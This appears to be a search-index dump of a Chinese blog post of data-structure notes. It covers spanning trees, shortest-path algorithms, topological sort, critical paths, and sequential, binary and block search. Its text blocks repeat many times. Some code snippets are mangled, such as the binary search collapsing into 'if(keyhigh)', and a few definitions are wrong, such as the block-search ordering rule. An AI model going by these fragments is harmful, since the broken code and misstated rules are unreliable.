在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#有向无环图"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#aoe网"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#aov网"},{"categories":["notice"],"content":"\r图的应用无向图的生成树 最小生成树Minimum Spanning Tree 给定一个无向网络，在该网的所有生成树中，是的个边权值之和最小的那棵生成树称为该网的最小生成树，也叫最小代价生成树。 **MST性质：**设N=(V,E)是一个连通网，U是顶点集V的一个非空子集。若边(u,v)是一条具有最小权值的边，其中u属于U，v属于V-U，则必存在一颗包含边(u,v)的最小生成树。 **MST性质解释：**在生成树的构造过程中，图中n个顶点分数两个集合： 已落在生成树上的顶点集：U 尚未落在生成树上的顶点集：V-U 接下来应该在所有连通U中顶点和V-U中顶点的边中选取权值最小的边。 **贪心算法(Greedy Algorithm)：**以当前情况为基础作最优选择，而不考虑各种可能的整体情况，所以贪心法不要回溯。（因为省去了为寻找解而穷尽所有可能所必须耗费的大量时间，因此算法效率高。） 普里姆(Prim)算法算法思想： 设连通网络 N = { V, E }，从某顶点 u0 出发，选择与它关联的具有最小权值的边(u0, v)，将其顶点加入到生成树的顶点集合U中 每一步从一个顶点在U中，而另一个顶点不在U中的各条边中选择权值最小的边(u, v),把它的顶点加入到U中 直到所有顶点都加入到生成树顶点集合U中为止 克鲁斯卡尔(Kruskal)算法算法思想： 设连通网络 N = { V, E }，构造一个只有 n 个顶点，没有边的非连通图 T = { V,  }, 每个顶点自成一个连通分量 在 E 中选最小权值的边,若该边的两个顶点落在不同的连通分量上，则加入 T 中；否则舍去，重新选择 重复下去，直到所有顶点在同一连通分量上为止 **最小生成树可能不唯一 ** 两种算法比较 算法名 普里姆算法 克鲁斯卡尔算法 算法思想 选择点 选择边 时间复杂度 O(n^2),n为顶点数 O(eloge),e为边数 适应范围 稠密图 稀疏图 **Prim算法：**归并顶点，与边数无关，适于稠密网 **Kruskal算法：**归并边，适于稀疏网 最短路径\r单源最短路径——Dijkstra(迪杰斯特拉)算法 初始化：先找出从源点v0到各终点vk的直达路径（v0,vk），即通过一条弧到达的路径。 选择：从这些路径中找出一条长度最短的路径（v0,u）。 更新：然后对其余各条路径进行适当调整：若在图中存在弧（u,vk），且（v0,u）+（u,vk）\u003c（v0,vk）,则以路径（v0,u,vk）代替（v0,vk）。 在调整后的各条路径中，再找长度最短的路径，依此类推。 步骤： 1.把V分成两组 （1）S：已求出最短路径的顶点的集合。 （2）T=V-S：尚未确定最短路径的顶点集合。 2.将T中顶点按最短路径递增的次序加入到S中，保证： （1）从源点v0到s中各顶点的最短路径长度都不大于从v0到T中任何顶点的最短路径长度。 （2）每个顶点对应一个距离值。 **S中顶点：**从v0到此顶点的最短路径长度。 **T中顶点：**从v0到此顶点的只包括S中顶点作中间顶点的最短路径长度。 所有顶点间的最短路径——Floyd(弗洛伊德)算法算法思想： 逐个试探顶点，从vi到vj的所有可能存在的路径中选出一条长度最短的路径。 步骤： 初始时设置一个n阶方阵，令其对角线元素为0，若存在弧，则对应元素为权值；否则为∞。 逐步试着再原直接路径中增加中间点，若加入中间顶点后路径变短，则修改；否则，维持原值。所有顶点试探完毕，算法结束。 有向无环图DAG图（Directed Acycline Graph），常用来描述一个工程或系统的进行过程。 AOE网用一个有向图表示一个工程的各子工程及其相互制约的关系，以弧表示活动，以顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网（Activity On Edge）。 **用途：**估算工程项目的完成时间 术语： 源点：整个工程开始点，也称起点。 收点：整个工程结束点，也称汇点。 事件结点：单位时间，表示的是时刻。 活动（有向边）：它的权值定义为活动进行所需要的时间。方向表示起始结点事件先发生，而终止结点事件才能发生。 事件的最早发生时间（Ve(j)）：从起点到本结点的最长的路径。意味着事件最早能够发生的时刻。 事件的最迟发生时间（Vl (j)）：不影响工程的如期完工，本结点事件必须发发生的时刻。 活动的最早开始时间：e( ai ) = Ve( j ) 活动的最迟开始时间：l( ai ) = Vl( k ) - dut( j , k )。 AOV网用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，这种有向图称为顶点表示活动的网，简称AOV网（Activity On Vertex network）。 拓扑排序： 在AOV 网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若 AOV 网中有弧 存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。 拓扑排序的方法： 在有向图中选一个没有前驱的顶点且输出之。 从图中删除该顶点和所有以它为尾的弧。 重复上述两步，直至全部顶点均已输出或者当图中不存在无前驱的顶点为止。 一个AOV网的拓扑序列时不唯一的。 **拓扑排序的应用：**检测AOV网中是否存在环： 对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。 关键路径把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。 事件表示在它之前的活动已经完成，在它之后的活动可以开始。 关键路径——路径长度最长的路径。 路径长度——路径上各活持续时间之和。 定义关键路径，需要定义4个描述量： 如何找L(i)==e(i)的关键活动？ 如何求ve(j)和vl(j)? 例题： 关键路径的讨论： 若网中有几条关键路径则需加快同时在几条关键路径上的关键活动。 如果一个活动处于所有的关键路径上，那么提高这个活动的速度，就能缩短整个工程的完成时间。 处于所有的关键路径上的活动完成时间不能缩短太多，否则会使原来的关键路径变成不是关键路径。这时，必须重新寻找关键路径。 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:5","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#关键路径"},{"categories":["notice"],"content":"\r0x7查找","date":"2023-12-19","objectID":"/data_structure_notes/:7:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x7查找"},{"categories":["notice"],"content":"\r查找的基本概念\r名词解释**查找表：**是由同一类型的数据元素(或记录) 构成的集合。由于“集合”中的数据元素之间存在着松散的关系，因此查找表是一种应用灵便的结构。 **关键字：**用来标识一个数据元素（或记录）的某个数据项的值。 **主关键字：**可唯一地标识一个记录的关键字是主关键字； **次关键字：**反之，用以识别若干记录的关键字是次关键字。 **静态查找表：**仅作“查找”（检索）操作的查找表。 **动态查找表：**作“插入”和“删除”操作的查找表。 查找算法的评价指标关键字的平均比较次数，也称平均查找长度ASL(Average Search Length) ","date":"2023-12-19","objectID":"/data_structure_notes/:7:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#查找的基本概念"},{"categories":["notice"],"content":"\r查找的基本概念\r名词解释**查找表：**是由同一类型的数据元素(或记录) 构成的集合。由于“集合”中的数据元素之间存在着松散的关系，因此查找表是一种应用灵便的结构。 **关键字：**用来标识一个数据元素（或记录）的某个数据项的值。 **主关键字：**可唯一地标识一个记录的关键字是主关键字； **次关键字：**反之，用以识别若干记录的关键字是次关键字。 **静态查找表：**仅作“查找”（检索）操作的查找表。 **动态查找表：**作“插入”和“删除”操作的查找表。 查找算法的评价指标关键字的平均比较次数，也称平均查找长度ASL(Average Search Length) ","date":"2023-12-19","objectID":"/data_structure_notes/:7:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#名词解释"},{"categories":["notice"],"content":"\r查找的基本概念\r名词解释**查找表：**是由同一类型的数据元素(或记录) 构成的集合。由于“集合”中的数据元素之间存在着松散的关系，因此查找表是一种应用灵便的结构。 **关键字：**用来标识一个数据元素（或记录）的某个数据项的值。 **主关键字：**可唯一地标识一个记录的关键字是主关键字； **次关键字：**反之，用以识别若干记录的关键字是次关键字。 **静态查找表：**仅作“查找”（检索）操作的查找表。 **动态查找表：**作“插入”和“删除”操作的查找表。 查找算法的评价指标关键字的平均比较次数，也称平均查找长度ASL(Average Search Length) ","date":"2023-12-19","objectID":"/data_structure_notes/:7:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#查找算法的评价指标"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(key\u003cST.R[mid].key) high=mid-1; else low=mid+1; } return 0; } （递归算法） int Search_Bin(SSTable ST,KeyType key,int low,int high){ if(low\u003ehigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key\u003cST.elem[mid].key) .....//递归，在前半区间进行查找 else .....//递归，在后半区间进行查找 } 性能分析判定树 平均查找长度 特点**优点：**效率比顺序查找高。 **缺点：**只适用于有序表，且限于顺序存储结构(对线性链表无效) 分块查找（索引顺序查找） 条件1.将表分成几块，且表或者有序，或者分块有序； 若i\u003cj，则第i块中所有记录的关键字均大于第i块中的最大关键字。 2.建立“索引表” (每个结点含有最大关键字域和指向本块第一个结点的指针，且按关键字有序)。 查找过程先确定待查记录所在块（顺序或折半查找），再在块内查找（顺序查找）。 性能分析\r特点优点: 插入和删除比较容易，无需进行大量移动。 **缺点:**要增加一个索引表的存储空间并对初始索引表进行排序运算。 适用情况: 如果线性表既要快速查找又经常动态变化，则可采用分块查找。 查找方法比较 顺序查找 折半查找 分块查找 ASL 最大 最小 中间 表结构 有序表、无序表 有序表 分块有序 储存结构 顺序表、线性链表 顺序表 顺序表、线性链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#线性表查找"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顺序查找"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#应用范围"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 }ElemType; 算法实现 int Search_Seq(SSTable ST,KeyType key){ for(i=ST.length;i\u003e=1;--i) if(ST.R[i].key==key) return i; return 0; } 算法改进： 把待查关键字key存入表头 (“哨兵”、“监视哨”) ，从前往后逐个比较，可免去查找过程中每一步都要检测是否查找完毕，加快速度。 int Search_Seq(SSTable ST,KeyType key) { ST.R[0].key = key; for(i = ST.length;ST.R[i].key != key; --i); return i; } 当ST.length较大时，此改进能使进行依次查找所需的平均时间几乎减少一半。 性能分析**时间复杂度：**O(n) **空间复杂度：**一个辅助空间——O(1) 提高查找效率记录的查找概率不相等时如何提高查找效率？ 查找表存储记录原则——按查找概率高低存储： 1)查找概率越高，比较次数越少 2)查找概率越低，比较次数较多 记录的查找概率无法测定时如何提高查找效率？ 方法——按查找概率动态调整记录顺序: 1)在每个记录中设一个访问频度域 2)始终保持记录按非递增有序的次序排列 3)每次查找后均将刚查到的记录直接移至表头 特点优点: 算法简单，逻辑次序无要求，且不同存储结构均适用。 缺点: ASL太长，时间效率太低。 折半查找每次将待查记录所在区间缩小一半。 算法实现（非递归） int Search_Bin(SSTable ST, KeyType key){ low=1;high=ST.length; while(low\u003c=high){ mid=(low+high)/2; if(ST.R[mid].key==key) return mid; else if(keyhigh) return 0; mid=(low+high)/2; if(key==ST.elem[mid].key) return mid; else if(key","date":"2023-12-19","objectID":"/data_structure_notes/:7:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#数据元素类型定义"},{"categories":["notice"],"content":"\r线性表查找\r顺序查找\r应用范围 顺序表或线性表标识的静态查找表 表内元素之间无序 数据元素类型定义 typedef struct{ KeyType key; //关键字域 .... //其他域 